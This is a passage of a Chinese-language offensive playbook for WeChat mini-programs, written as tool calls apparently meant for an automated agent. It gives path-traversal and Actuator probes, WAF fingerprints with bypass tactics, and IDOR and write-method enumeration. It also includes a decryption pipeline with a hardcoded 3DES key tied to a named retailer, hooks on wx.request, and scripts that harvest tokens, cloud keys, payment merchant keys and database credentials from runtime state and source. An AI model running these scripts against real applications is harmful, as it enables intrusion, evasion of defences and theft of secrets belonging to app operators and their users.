**③ 路径遍历 CVE 探针与 WAF 指纹识别**

```
# 路径遍历 CVE 探针（含 WAF 418 检测）
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var probes=[
    {label:'basic_lfi',         path:'/../../../etc/passwd'},
    {label:'encoded_lfi',       path:'/%2e%2e/%2e%2e/etc/passwd'},
    {label:'double_encoded',    path:'/%252e%252e/%252e%252e/etc/passwd'},
    {label:'null_byte',         path:'/../../../etc/passwd%00.jpg'},
    {label:'semicolon_spring',  path:'/static/..;/WEB-INF/web.xml'},
    {label:'actuator_env',      path:'/actuator/env'},
    {label:'actuator_heap',     path:'/actuator/heapdump'},
    {label:'double_slash',      path:'//etc//passwd'},
    {label:'windows_ini',       path:'/../../../windows/win.ini'},
    {label:'dot_segment',       path:'/./etc/passwd'},
  ];
  var results=[];
  for(var p of probes){
    var r=await fetch(p.path,{method:'GET'});
    var hdrs={};
    for(var [k,v] of r.headers) hdrs[k]=v;
    results.push({
      label:p.label,status:r.status,
      wafHint:hdrs['server']||hdrs['x-protected-by']||hdrs['cf-ray']||'',
      preview:(await r.text()).slice(0,150)
    });
  }
  return JSON.stringify(results,null,2);
})()")
```

| 状态码 | 含义 | 后续操作 |
|--------|------|---------|
| **200** + `root:x:0:0` 或文件内容 | 🔴 路径遍历确认 | 枚举 `/etc/shadow`、`.env`、SSH 私钥 |
| **200** + 空/JSON 响应 | 路径被规范化，无漏洞 | 记录为已防御 |
| **404** | 已修补 或 WAF 统一返回 404 | 尝试双重编码变体（`%252e`）|
| **403** | ACL 或 WAF 拦截 | 测试路径操纵绕过（`..;/`、`%2e%2e/`）|
| **418** | 🔴 **WAF 主动拦截**（商业 WAF 特征码）| 识别 WAF 厂商，执行绕过流程 |
| **406** | WAF 拦截（ModSecurity 常见）| 尝试 chunked 传输绕过 |

**WAF 指纹速查（418 响应时读取响应头 / Body）：**

```
响应特征                                  → WAF 厂商         → 主要绕过策略
Server: cloudflare + cf-ray 头            → Cloudflare       → chunked + 路径操纵
X-Sucuri-ID 头                            → Sucuri WAF       → 大小写 + 空格替代
响应体含 ModSecurity / NOYB               → ModSecurity      → 参数污染 HPP + 多行注释
响应体含 安全狗 / safedog.cn              → 安全狗           → 双重 URL 编码
响应体含 宝塔 / bt.cn                     → 宝塔 WAF         → chunked 分段传输
响应体含 yunsuo / 云锁                    → 云锁             → Unicode 全角编码
阿里云拦截页 / 阿里云盾特征               → 阿里云盾         → 参数位置变换 + HPP
```

> ⚠️ WAF 统一返回 404 时不能排除漏洞存在：尝试双重 URL 编码（`%252e%252e%252f`）或路径参数注入（`/app;foo=bar/../../../etc/passwd`），绕过 WAF 的路径匹配规则后观察后端响应。Spring Actuator 端点（`/actuator/env`、`/actuator/heapdump`）无需路径穿越即可泄露配置和内存 dump，优先检测。

**④ 带路由参数的服务端点发现（行为变化）**

```
# REST 风格路由参数枚举——发现行为变化端点
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var token='<当前有效token>';
  var resources=['users','orders','products','items','accounts',
    'members','profiles','records','projects','articles'];
  var testIds=[1,2,3,100,'me','current',0,'undefined'];
  var results=[];
  for(var res of resources){
    for(var id of testIds.slice(0,4)){
      var r=await fetch('/api/'+res+'/'+id,{method:'GET',
        headers:{'Authorization':'Bearer '+token}});
      var body='';
      if(r.status===200) body=(await r.text()).slice(0,300);
      results.push({url:'/api/'+res+'/'+id,status:r.status,
        preview:r.status===200?body:''});
    }
  }
  return JSON.stringify(results.filter(r=>r.status===200),null,2);
})()")
```

**行为变化判断标准：**

| 端点响应 | 行为变化类型 | 后续操作 |
|---------|-------------|---------|
| `/api/users/1` → 200 + 他人数据 | 🔴 **行为变化**：IDOR 面暴露 | 枚举相邻 ID，见 Phase 2.2 |
| `/api/users/1` → 200 + 自己数据 | ⚠️ 后端绑定 token，路径参数被忽略 | 换无效 token 确认是否真正绑定 |
| DELETE `/api/users/1` → 200 | 🔴 **行为变化**：越权写操作 | 立即确认并停止（避免误删真实数据）|
| `/api/users/undefined` → 200 | 🔴 **行为变化**：未初始化参数路径 | 见 Phase 2.2.1 undefined IDOR |
| `/api/users/0` → 200 + 特殊数据 | 🔴 边界值未过滤 | 检查 ID=0 是否为特权账号 |
| 所有路径返回 404 | 路由前缀不匹配 | 检查 /v1/ /v2/ /rest/ 等版本前缀 |

```
# HTTP 方法枚举（确认允许方法 = 行为变化矩阵）
runtime_ops(action="runtime_eval", expression="(async ()=>{
  var url='/api/<存活资源>/<id>';
  var token='<token>';
  var methods=['GET','POST','PUT','PATCH','DELETE','OPTIONS'];
  var results=[];
  for(var m of methods){
    var init={method:m,headers:{'Authorization':'Bearer '+token,
      'Content-Type':'application/json'}};
    if(m!=='GET') init.body=JSON.stringify({});
    var r=await fetch(url,init);
    results.push({method:m,status:r.status});
  }
  return JSON.stringify(results,null,2);
})()")
// GET/PUT/DELETE 同时返回 200 → 越权写操作风险（行为变化最高优先级）
// OPTIONS 返回 Allow 头 → 直接读取服务端允许方法列表
```

---

## Phase 3：流量解密分析

### 3.1 编码识别（第一步）

```python
decrypt_ops(action="auto_detect_encoding", value="<未知编码值>")
# 返回 candidates: ["base64", "hex", "base64url", "url_encoded"] 等
```

### 3.2 单步解密

```python
# AES-CBC（需 key 和 IV）
decrypt_ops(action="decrypt_payload",
            value="<base64密文>",
            algorithm="aes",
            key="<key>",
            iv="<iv>",
            mode="cbc",
            input_encoding="base64",
            key_encoding="utf-8",
            iv_encoding="utf-8")

# AES-ECB（无 IV）
decrypt_ops(action="decrypt_payload",
            value="<base64密文>",
            algorithm="aes",
            key="<key>",
            mode="ecb",
            input_encoding="base64",
            key_encoding="utf-8")

# 3DES-ECB（兼容 CryptoJS 零填充不足 24 字节 key）
decrypt_ops(action="decrypt_payload",
            value="<base64密文>",
            algorithm="3des",
            key="ed1d2af1b7a9bc",
            mode="ecb",
            input_encoding="base64",
            key_encoding="utf-8")

# RSA 解密（需 PEM 格式私钥）
decrypt_ops(action="decrypt_payload",
            value="<base64密文>",
            algorithm="rsa",
            key="<PEM私钥>",
            input_encoding="base64")

# MD5 / SHA / HMAC
decrypt_ops(action="decrypt_payload", value="<text>", algorithm="md5", input_encoding="utf-8")
decrypt_ops(action="decrypt_payload", value="<text>", algorithm="sha256", input_encoding="utf-8")
decrypt_ops(action="decrypt_payload", value="<data>", algorithm="hmac-sha256",
            key="<key>", input_encoding="utf-8", key_encoding="utf-8")
```

### 3.3 多层解密流水线

```python
# 三层解密：3DES-ECB → MD5-Key-Derive → AES-CBC（唯品会模式）
decrypt_ops(action="run_decrypt_pipeline",
            value="<mina_edata_base64>",
            steps=[
              # Step 1: 3DES-ECB 解出 base_secret
              {
                "type": "3des",
                "key": "ed1d2af1b7a9bc",
                "mode": "ecb",
                "input_encoding": "base64",
                "key_encoding": "utf-8"
              },
              # Step 2: MD5 派生 AES key（base_secret + & + VIP_TANK）
              {
                "type": "md5-key-derive",
                "key": "<VIP_TANK_session_token>",
                "key_encoding": "utf-8"
              },
              # Step 3: AES-CBC 解密（key/iv 由流水线上下文自动注入）
              {
                "type": "aes",
                "mode": "cbc",
                "input_encoding": "base64"
              }
            ])

# 通用二层：AES-CBC 响应解密 → JSON parse
decrypt_ops(action="run_decrypt_pipeline",
            value="<加密响应体>",
            steps=[
              {"type": "aes", "key": "<key>", "iv": "<iv>", "mode": "cbc",
               "input_encoding": "base64", "key_encoding": "utf-8"},
              {"type": "base64"}  # 如果 AES 输出仍是 base64
            ])
```

### 3.4 密码学攻击检测（v2.0 新增）

```python
# ECB 模式检测 — 相同的 16 字节明文块产生相同的密文块
# 如果密文存在重复的 16 字节块 → ECB 模式 → 可进行块重排攻击
decrypt_ops(action="detect_ecb_pattern", value="<base64密文>")

# Padding Oracle 检测
# 修改密文末尾字节 → 观察服务端响应差异
# 500/padding error vs 200/data error → Oracle 存在
analysis_ops(action="compare_two_requests",
             request_id_a="<原始请求>",
             request_id_b="<篡改密文末尾字节的请求>")

# CBC Bit-Flip 检测
# 修改第 N 个密文 block → 精确翻转第 N+1 个明文 block 对应字节
# 适用于: role=user → role=admin 的加密 Cookie/Token
```

### 3.5 动态密钥追踪

如果静态分析无法确定 key/IV，使用断点追踪：

```
# 在加密函数调用前打断点
debugger_ops(action="break_on_xhr", url="/api/")
  → 拦截 XHR 请求，在加密前暂停

debugger_ops(action="get_paused_info")
  → 查看调用栈和作用域变量（含密钥值）

debugger_ops(action="evaluate_script",
             expression="JSON.stringify({key: _aesKey, iv: _iv, mode: _cipherMode})")
  → 在断点处动态求值获取密钥

debugger_ops(action="step", action_type="into")
  → 单步进入加密函数

debugger_ops(action="resume_execution")
  → 恢复执行
```

### 3.6 运行时加密发现

```
decrypt_ops(action="discover_runtime_crypto_functions")
  → 自动发现页面中可调用的加密/解密函数

decrypt_ops(action="call_runtime_crypto_function",
            function_name="<函数名>",
            args=["<参数1>", "<参数2>"])
  → 在运行时调用加密函数，获取输入输出对照
```

---

## Phase 4：逆向分析与代码审计

### 4.1 代码保护类型识别

```
# 第一步: 判断代码保护级别
debugger_ops(action="search_in_sources", query="webpackJsonp|__webpack_require__|webpackChunk")
  → Webpack 打包 → 跳转 4.2

debugger_ops(action="search_in_sources", query="_0x[a-f0-9]{4,6}|var _0x|\\\\u0030|\\\\x30")
  → OB 混淆 (obfuscator.io) → 跳转 4.3

debugger_ops(action="search_in_sources",
             query="while.*true.*switch|for.*;;.*switch|case\\s+\\d{4,}:")
  → JSVMP 虚拟机保护 → 跳转 4.4
```

### 4.2 Webpack 拆包分析

```
# 列出所有 chunk
debugger_ops(action="search_in_sources", query="webpackChunkName|chunk-.*\\.js")

# 搜索特定 chunk 的内容
debugger_ops(action="get_script_source", url="<chunk URL>")

# 定位业务逻辑 chunk（按模块名搜索）
debugger_ops(action="search_in_sources", query="encrypt|decrypt|request|sign|api")

# Webpack 模块映射还原
# 每个模块通过 __webpack_require__(moduleId) 引用
# moduleId 通常在注释中标注: /* harmony import */ var _api = __webpack_require__(123)
# 搜索 __webpack_require__ 调用，建立 moduleId → 功能 映射表
```

### 4.3 OB 混淆还原

```
# OB 混淆特征: _0x 前缀变量 + 十六进制字符串数组
# 还原步骤:
1. 保存混淆脚本: debugger_ops(action="save_script_source", url="<URL>")
2. 提取字符串数组: 查找脚本顶部的大数组定义 var _0xabcd = [...]
3. 还原字符串引用: 将 _0x1234('0x1a2b') 替换为实际字符串值
4. 变量重命名: 将 _0x 前缀变量根据用途重命名
5. 控制流平坦化还原: 识别 switch-case 状态机 → 追踪状态转移 → 重组代码顺序

# 在运行时环境中还原字符串（利用小程序 JS 引擎）
runtime_ops(action="runtime_eval",
            expression="(()=>{const arr=['hello','world','encrypt'];return arr.map((s,i)=>`_0x${i.toString(16)} = ${s}`).join('\\n')})()")
```

### 4.4 JSVMP 虚拟机保护分析

```
# JSVMP 识别标志：
# - 单文件 200KB+，函数/变量名完全无意义
# - 自定义解释器: while(true) { switch(opcode) { ... } }
# - 改写/劫持浏览器原生 API（XHR / fetch / Cookie）
# - 超大字节码数组 + 指针变量 + 栈操作 + 跳转指令

# 路径选择决策：
├─ JSVMP 劫持请求链路（XHR/fetch 拦截器）？
│   ├─ YES + 算法与环境深度绑定 → 走路径 B（动态 Hook 截取）
│   └─ YES + 签名逻辑相对独立 → 走路径 A（Hook 出入口追踪算法）
├─ JSVMP 仅生成签名参数？
│   ├─ 确认使用标准算法 → 路径 A，纯算法还原
│   └─ 完全自定义 + 环境依赖重 → 路径 B
└─ 无法判断 → 先快速测试路径 B（30 分钟），不行再走路径 A

# 路径 A: Hook 出入口追踪
# Step 1: Hook 加密/签名的输入输出
runtime_ops(action="runtime_eval",
            expression="(()=>{const orig=wx.request;wx.request=function(obj){if(obj.url.includes('/api/')){console.log('[REQ]',obj.url,JSON.stringify(obj.data).slice(0,500))};return orig.apply(this,arguments)}})()")

# Step 2: Hook 加密函数本身
debugger_ops(action="break_on_xhr", url="/api/")
  → get_paused_info(include_scopes=True)
  → evaluate_js 获取密钥和明文

# 路径 B: 动态 Hook 截取签名结果
# 在 wx.request 调用前注入 Hook，截取最终签名值
network_ops(action="hook_wx_request")
  → 自动捕获加密前后的参数对比
```

### 4.5 小程序特有逆向要点

```
# 1. wx.request 拦截
runtime_ops(action="runtime_eval",
            expression="(()=>{const o=wx.request;wx.request=function(c){const s=new Error().stack;console.log('[STACK]',s.slice(0,500));return o.call(this,c)}})()")

# 2. 全局加密函数发现
runtime_ops(action="runtime_eval",
            expression="(()=>Object.keys(globalThis).filter(k=>typeof globalThis[k]==='function'&&(k.toLowerCase().includes('encrypt')||k.toLowerCase().includes('decrypt')||k.toLowerCase().includes('sign')||k.toLowerCase().includes('crypto'))))()")

# 3. Storage 中的敏感密钥提取
runtime_ops(action="runtime_eval",
            expression="(()=>{try{return JSON.stringify({sync:wx.getStorageInfoSync(),keys:wx.getStorageInfoSync().keys.filter(k=>/key|token|secret|sign|iv|crypto|aes|des/i.test(k))})}catch(e){return String(e)}})()")

# 4. 检测反调试
runtime_ops(action="runtime_eval",
            expression="(()=>{const checks=[];try{eval('debugger')}catch(e){checks.push('eval_blocked')};if(Function.prototype.toString().includes('native'))checks.push('toString_ok');return checks})()")
```

### 4.6 批量断点追踪多个接口的加密调用栈

```
# 对每个需要分析的加密接口：
for request_id in <加密请求列表>:
    debugger_ops(action="break_on_xhr", url="<该请求的 API 路径>")
    network_ops(action="trace_request_callstack", request_id=request_id)
      → 记录: 加密函数名 + 文件位置 + 行号
      → 同一加密函数被多个路由共享 → 集中分析该函数
      → 不同路由使用不同加密函数 → 逐一分析
```

### 4.7 源码与运行时敏感信息检测（v2.8 重写 — 最高优先级）

**核心原则：密钥既可能硬编码在字符串字面量中（正则可扫），也可能藏在 `getApp().globalData`、Webpack 模块对象、require 导出的 config 模块、Storage 非关键词 key 中（正则扫不到）。两路并行，缺一不可。**

#### 4.7.0 运行时变量深度提取（v2.8 新增 — 先于正则扫描执行）

**执行时机：Phase 0 环境搭建完成后立即执行，不依赖 search_in_sources（cachedata 格式也有效）。**

##### A. getApp().globalData 深度提取（命中率最高）

```javascript
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{
    try{
      var app=getApp();
      if(!app) return 'getApp() returned null';
      // 递归展开嵌套对象（最多 3 层），不做正则过滤，全量输出
      function flat(obj,prefix,depth){
        var r={};
        if(depth>3||!obj||typeof obj!=='object'||Array.isArray(obj)) return r;
        Object.keys(obj).forEach(function(k){
          try{
            var v=obj[k];
            var fk=prefix?prefix+'.'+k:k;
            if(typeof v==='object'&&v!==null) Object.assign(r,flat(v,fk,depth+1));
            else r[fk]=String(v).slice(0,300);
          }catch(e){}
        });
        return r;
      }
      var all=flat(app,'app',0);
      // 第一遍：敏感字段关键词命中
      var sensitive={};
      Object.keys(all).forEach(function(k){
        if(/token|secret|key|ak|sk|pass|auth|api|baseUrl|base_url|host|endpoint|env|appid|openid|unionid|bucket|region|oss|cos|cdn|sms|push|map|pay|private|mch/i.test(k))
          sensitive[k]=all[k];
      });
      return JSON.stringify({
        allCount:Object.keys(all).length,
        sensitiveCount:Object.keys(sensitive).length,
        sensitive:sensitive,
        rawGlobalData:JSON.stringify(app.globalData||{}).slice(0,2000)
      });
    }catch(e){return 'ERR:'+String(e)}
  })()")

→ 典型命中：app.globalData.accessKeyId / secretKey / baseUrl / mapKey / smsKey
→ 若 globalData 中发现 AK/SK → 🔴 CRITICAL，无需等正则扫描，立即报告
```

##### B. Webpack 模块缓存遍历（config.js / constants.js / request.js 全命中）

```javascript
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{
    try{
      // __webpack_require__.c 是已缓存的模块实例；.m 是模块定义函数
      var cache=null;
      if(typeof __webpack_require__!=='undefined'){
        cache=__webpack_require__.c||__webpack_require__.m;
      }
      if(!cache) return JSON.stringify({status:'webpack not found'});
      
      var hits=[];
      Object.keys(cache).forEach(function(k){
        try{
          var mod=cache[k];
          var exp=mod&&mod.exports!==undefined?mod.exports:mod;
          var s=JSON.stringify(exp);
          if(!s||s.length<5||s.length>30000) return;
          if(/secret|apiKey|api_key|accessKey|access_key|appSecret|app_secret|baseUrl|base_url|apiUrl|api_url|apiHost|api_host|bucket|oss.*config|cos.*config|cdnUrl|smsKey|pushKey|mapKey|mchId|mchKey|payKey|privateKey|paySecret/i.test(s)){
            hits.push({moduleId:k, preview:s.slice(0,500)});
          }
        }catch(e){}
      });
      return JSON.stringify({totalModules:Object.keys(cache).length,hitCount:hits.length,hits:hits.slice(0,15)});
    }catch(e){return 'ERR:'+String(e)}
  })()")

→ 关键说明：Webpack 压缩后对象属性名不变（如 baseUrl/secretKey），即使变量名变了属性名也在
→ 命中含 secretKey/appSecret 的模块 → 提取完整内容，确认值是否为真实密钥
```

##### C. require() 主动加载已知 config 模块路径

```javascript
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{
    var paths=[
      'config','./config','../config',
      'config/index','../config/index','../../config/index',
      'utils/config','utils/request','utils/http','utils/api','utils/constant',
      'common/config','common/constants','common/api','common/env',
      'api/config','api/base','api/index',
      'constants','./constants','../constants',
      'env','./env','../env','./settings','settings',
      'store/index','store/modules/user',
    ];
    var found={};
    paths.forEach(function(p){
      try{
        var m=require(p);
        var s=JSON.stringify(m);
        if(s&&s.length>2&&s!=='{}') found[p]=s.slice(0,600);
      }catch(e){}
    });
    return JSON.stringify({tried:paths.length,found:Object.keys(found).length,modules:found});
  })()")

→ require('config/index') 导出含 {baseUrl, appId, mapKey} → 记录全部值
→ require('utils/request') 导出含 {baseURL, secretKey} → 🔴 API 密钥泄露
```

##### D. Storage 全量扫描（不用关键词过滤 key，看值的内容）

```javascript
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{
    try{
      var info=wx.getStorageInfoSync();
      var all={};
      info.keys.forEach(function(k){
        try{
          var v=wx.getStorageSync(k);
          var s=typeof v==='string'?v:JSON.stringify(v);
          // 跳过广告缓存和日志（通常很长），保留中小尺寸条目
          if(s&&s.length>2&&s.length<3000) all[k]=s.slice(0,300);
        }catch(e){}
      });
      return JSON.stringify({
        totalKeys:info.keys.length,
        currentSizeKB:Math.round(info.currentSize/1024),
        allEntries:all
      });
    }catch(e){return 'ERR:'+String(e)}
  })()")

→ 不用关键词过滤 key 名！「config」「appEnv」「setting」这类无害 key 名的值中可能含 AK/SK
→ 逐条检视所有值，特别关注 JSON 对象类型的存储值
```

##### E. 页面 data / props 中的敏感状态

```javascript
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{
    try{
      var pages=getCurrentPages();
      var results=[];
      pages.forEach(function(p){
        var d=p.data||{};
        var s=JSON.stringify(d);
        // 页面 data 中常存放 token/userId/phone/openId 等运行时状态
        if(/token|userId|openId|unionId|phone|mobile|idCard|secret|key|ak|password/i.test(s)){
          results.push({route:p.route,sensitiveData:s.slice(0,1000)});
        }
      });
      return JSON.stringify(results);
    }catch(e){return 'ERR:'+String(e)}
  })()")
```

##### F. wx.getAccountInfoSync() — 确认运行环境（影响后续利用策略）

```javascript
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{
    try{
      var info=wx.getAccountInfoSync();
      return JSON.stringify({
        appId:info.miniProgram&&info.miniProgram.appId,
        envVersion:info.miniProgram&&info.miniProgram.envVersion,
        version:info.miniProgram&&info.miniProgram.version
      });
    }catch(e){return 'ERR:'+String(e)}
  })()")

→ envVersion='develop' → 开发版，更可能含 debug 信息、测试密钥、内网地址
→ envVersion='trial'   → 体验版
→ envVersion='release' → 正式版
```

##### G. 全局对象深度遍历（不只是 function，也查 object 类型变量）

```javascript
runtime_ops(action="runtime_eval_appservice",
  expression="(()=>{
    var hits={};
    Object.keys(globalThis||{}).forEach(function(k){
      try{
        var v=globalThis[k];
        if(typeof v==='string'&&v.length>8&&v.length<500){
          // 检查字符串值是否匹配已知 AK 前缀
          if(/^(LTAI|AKID|AKIA|ghp_|sk-|ya29\.|AIza)/i.test(v)) hits[k]=v;
        } else if(typeof v==='object'&&v!==null){
          var s=JSON.stringify(v);
          if(s&&s.length>5&&s.length<8000&&
             /secret|apiKey|accessKey|appSecret|baseUrl|bucket|smsKey|mapKey|payKey|mchId/i.test(s))
            hits[k]=s.slice(0,500);
        }
      }catch(e){}
    });
    return JSON.stringify({hitCount:Object.keys(hits).length,hits:hits});
  })()")
```

**4.7.0 执行 checklist：**
```
□ A. getApp().globalData 全量展开并提取
□ B. Webpack 模块缓存遍历（含 .m 和 .c）
□ C. require() 主动加载 20+ 个常见 config 路径
□ D. Storage 全量扫描（不过滤 key 名）
□ E. 所有已打开页面的 data 状态检查
□ F. wx.getAccountInfoSync() 确认环境版本
□ G. globalThis 深度对象/字符串遍历
```

---

#### 4.7.1 全量脚本敏感信息扫描

```
# 第一步: 列出所有已加载脚本
debugger_ops(action="list_scripts")
  → 获取脚本 URL 列表

# 第二步: 对每个脚本执行敏感信息关键词搜索
# 以下搜索按危害等级分组，逐组执行
```

#### 4.7.2 云服务 AK/SK 检测（危害: CRITICAL）

```python
# 腾讯云 / 阿里云 / AWS / 七牛 / 又拍云 等云服务密钥
# 特征: 固定前缀 + 长字符串

# 腾讯云 SecretId / SecretKey
debugger_ops(action="search_in_sources",
             query="AKID[A-Za-z0-9]{32,48}|TENCENT_SECRET|secretId|secretKey|SecretId|SecretKey")
  → 命中 AKID... → 腾讯云 SecretId 泄露

# 阿里云 AccessKey
debugger_ops(action="search_in_sources",
             query="LTAI[A-Za-z0-9]{16,24}|ALIBABA_CLOUD_ACCESS|accessKeyId|accessSecret")
  → 命中 LTAI... → 阿里云 AK 泄露

# AWS Access Key
debugger_ops(action="search_in_sources",
             query="AKIA[A-Z0-9]{16}|AWS_ACCESS_KEY|aws_access_key|awsSecretAccessKey")

# 七牛云 AK/SK
debugger_ops(action="search_in_sources",
             query="qiniu|QINIU_ACCESS|QINIU_SECRET|ACCESS_KEY.*qiniu")

# 又拍云
debugger_ops(action="search_in_sources",
             query="upyun|UPYUN_|operator.*password|upyun.*secret")

# 百度云
debugger_ops(action="search_in_sources",
             query="bce[_-]|BAIDU_CLOUD|baidu.*access|baidu.*secret")

# 华为云
debugger_ops(action="search_in_sources",
             query="HUAWEI_CLOUD|huawei.*access|huawei.*secret|HW_ACCESS")

# 京东云
debugger_ops(action="search_in_sources",
             query="JD_CLOUD|jdcloud|JD_ACCESS|JD_SECRET")

# 通用云服务 AK/SK 模式匹配（宽松模式 — Webpack 压缩后也能命中）
debugger_ops(action="search_in_sources",
             query="accessKey|AccessKey|access_key|secretKey|SecretKey|secret_key|SECRET_KEY|ACCESS_KEY")

# ⚠️ v2.2 新增：Gateway 配置结构检测（Webpack 压缩后 AK/SK 常作为对象属性短名出现）
# 教训: "accessKey":"xxx","secretKey":"yyy" 在压缩后仍保留原始属性名
# 单独搜 accessKey 可能命中大量合法代码，需配合值模式精确匹配
debugger_ops(action="search_in_sources",
             query="accessKey\\s*[:\"]\\s*[\"'][A-Za-z0-9]{12,}[\"']|secretKey\\s*[:\"]\\s*[\"'][A-Za-z0-9]{12,}[\"']")
  → 精确匹配对象属性赋值的 AK/SK 键值对

# ⚠️ v2.2 新增：完整 Gateway 配置块搜索（最易漏报的场景）
# 压缩后的配置块形如: gateway:{host:p,accessKey:"xxx",secretKey:"yyy"}
debugger_ops(action="search_in_sources",
             query="gateway.*accessKey|gateway.*secretKey|apiGateway|API_GATEWAY|gatewayConfig")
  → 命中 gateway + accessKey/secretKey 同现 → 高概率泄露
```

**搜索后验证步骤（v2.2 新增 — 防止漏报）：**

```
# search_in_sources 对压缩代码的匹配可能不完整。
# 如果以上搜索全部返回 0 命中，执行以下二次验证：

# 验证 1: 直接搜 __wxConfig 中的配置信息
runtime_ops(action="runtime_eval",
            expression="(()=>{try{var s=JSON.stringify(__wxConfig||{});return s.length>100?s.slice(0,3000):s}catch(e){return String(e)}})()")

# 验证 2: 搜全局变量中的 host/gateway/env 配置
runtime_ops(action="runtime_eval",
            expression="(()=>{var r={};for(var k of Object.keys(globalThis||window||{})){if(/host|gateway|env|config|api|baseUrl/i.test(k)){try{r[k]=String(globalThis[k]).slice(0,200)}catch(e){}}}return JSON.stringify(r)})()")

# 验证 3: 搜所有脚本中直接出现的 32 位 hex 字符串（常见 SK 格式）
debugger_ops(action="search_in_sources",
             query="[a-f0-9]{32}|[A-F0-9]{32}")

# 验证 4: 搜 env/PROD/TEST/PRE 等环境配置关键字（常与 AK/SK 同现）
debugger_ops(action="search_in_sources",
             query="PROD.*host|TEST.*host|PRE.*host|env.*PROD|env.*TEST|\"PROD\"|\"TEST\"|\"PRE\"")
```

#### 4.7.3 API 密钥与 Token 检测（危害: CRITICAL）

```python
# 微信系 AppId / AppSecret
debugger_ops(action="search_in_sources",
             query="wx[a-f0-9]{16}|appSecret|AppSecret|app_secret|APP_SECRET|WX_APPID|WX_APPSECRET")
  → 命中格式为 wx + 16 位 hex → 微信 AppId 泄露
  → 命中 appSecret → 微信 AppSecret 泄露（最高危）

# 支付宝
debugger_ops(action="search_in_sources",
             query="alipay.*appId|alipay.*privateKey|alipay.*publicKey|ALIPAY_|app_private_key|alipay_public_key")

# 开放平台通用
debugger_ops(action="search_in_sources",
             query="appId.*['\"]\\w{16,}['\"]|appSecret.*['\"]\\w{32,}['\"]|app_key|app_secret|APP_KEY|APP_SECRET")

# 各平台 API Key
debugger_ops(action="search_in_sources",
             query="api[_-]?key|api[_-]?secret|api[_-]?token|API_KEY|API_SECRET|API_TOKEN|x-api-key|x-api-secret")

# 支付密钥（最高优先级 — 命中即严重漏洞）
debugger_ops(action="search_in_sources",
             query="mch_id|mch_key|mch_secret|partner_key|partnerKey|PAY_KEY|PAY_SECRET|paySignKey|wechatPay|wxPay|alipay.*key")
  → 命中 mch_key / partner_key → 微信支付/支付宝商户密钥泄露（严重）
```

#### 4.7.4 JWT / Session / 签名密钥检测（危害: HIGH）

```python
# JWT Secret
debugger_ops(action="search_in_sources",
             query="jwt[_-]?secret|jwt[_-]?key|JWT_SECRET|jwtSecret|tokenSecret|TOKEN_SECRET")

# Session 密钥
debugger_ops(action="search_in_sources",
             query="session[_-]?(secret|key)|SESSION_SECRET|sessionSecret|cookieSecret|COOKIE_SECRET")

# 签名/加密密钥
debugger_ops(action="search_in_sources",
             query="sign[_-]?key|sign[_-]?secret|SIGN_KEY|SIGN_SECRET|encrypt[_-]?key|encrypt[_-]?secret|ENCRYPT_KEY|CIPHER_KEY")
```

#### 4.7.5 数据库与存储凭据检测（危害: CRITICAL）

```python
# 数据库连接串
debugger_ops(action="search_in_sources",
             query="jdbc:|mongodb://|mysql://|postgresql://|redis://|mssql://|oracle:|sqlite:")
  → 命中连接串 → 数据库凭据明文泄露

# 数据库账号密码
debugger_ops(action="search_in_sources",
             query="DB_HOST|DB_PORT|DB_USER|DB_PASS|DB_PASSWORD|DB_NAME|DATABASE_URL|DB_CONNECTION|MYSQL_|POSTGRES_|REDIS_")

# Redis 密码
debugger_ops(action="search_in_sources",
             query="redis.*password|REDIS_PASSWORD|redis.*auth|requirepass")

# MongoDB
debugger_ops(action="search_in_sources",
             query="mongo.*password|MONGO_PASSWORD|mongo.*auth|mongodb.*credential")

# 数据库明文密码常见模式
debugger_ops(action="search_in_sources",
             query="password.*['\"]\\S{6,}['\"]|passwd.*['\"]\\S{6,}['\"]|pwd.*['\"]\\S{6,}['\"]")
```

#### 4.7.6 加密密钥硬编码检测（危害: HIGH）

```python
# AES / DES 密钥
debugger_ops(action="search_in_sources",
             query="aes[_-]?(key|iv)|AES_KEY|AES_IV|des[_-]?key|DES_KEY|_aesKey|_aesIv|_desKey|cryptoKey|cipherKey")

# RSA 私钥
debugger_ops(action="search_in_sources",
             query="BEGIN\\s*(RSA|EC|DSA|OPENSSH)\\s*PRIVATE\\s*KEY|-----BEGIN.*PRIVATE KEY-----")
  → 命中完整 PEM 格式私钥 → 严重漏洞

# 3DES 密钥
debugger_ops(action="search_in_sources",
             query="triple[_-]?des|3DES_KEY|3des[_-]?key|_3desKey|tripleDesKey")

# 硬编码密钥变量
debugger_ops(action="search_in_sources",
             query="secretKey\\s*[:=]\\s*['\"]\\w{8,}|secret\\s*[:=]\\s*['\"]\\w{8,}|key\\s*[:=]\\s*['\"]\\w{8,}|iv\\s*[:=]\\s*['\"]\\w{8,}")
```

#### 4.7.7 内网地址与基础设施泄露（危害: MEDIUM-HIGH）

```python
# 内网 IP / 域名
debugger_ops(action="search_in_sources",
             query="(10\\.|172\\.1[6-9]|172\\.2\\d|172\\.3[01]|192\\.168\\.)\\d{1,3}\\.\\d{1,3}|intranet|internal|dev\\.|test\\.|staging\\.|local\\.|localhost")

# 内网 API 地址
debugger_ops(action="search_in_sources",
             query="http://(10\\.|172\\.1[6-9]|172\\.2\\d|172\\.3[01]|192\\.168\\.)|https://(dev|test|staging|uat)\\.|http://(dev|test|staging|uat)\\.")

# OSS / CDN / 存储桶
debugger_ops(action="search_in_sources",
             query="oss-|cos\\.|s3\\.amazonaws|storage\\.googleapis|blob\\.core\\.windows|cloudfront|aliyuncs\\.com|myqcloud\\.com|qcloud\\.com")
  → OSS 地址 + 附近有 AK/SK → 存储桶接管风险
```

#### 4.7.8 第三方服务 Token 泄露（危害: MEDIUM-HIGH）

```python
# GitHub / GitLab Token
debugger_ops(action="search_in_sources",
             query="ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{22,}|glpat-[A-Za-z0-9_\\-]{20,}|github.*token|gitlab.*token|GITHUB_TOKEN|GITLAB_TOKEN")

# 钉钉 / 飞书 / 企业微信 Webhook
debugger_ops(action="search_in_sources",
             query="oapi\\.dingtalk\\.com/robot|open\\.feishu\\.cn/open-apis/bot|qyapi\\.weixin\\.qq\\.com/cgi-bin/webhook")
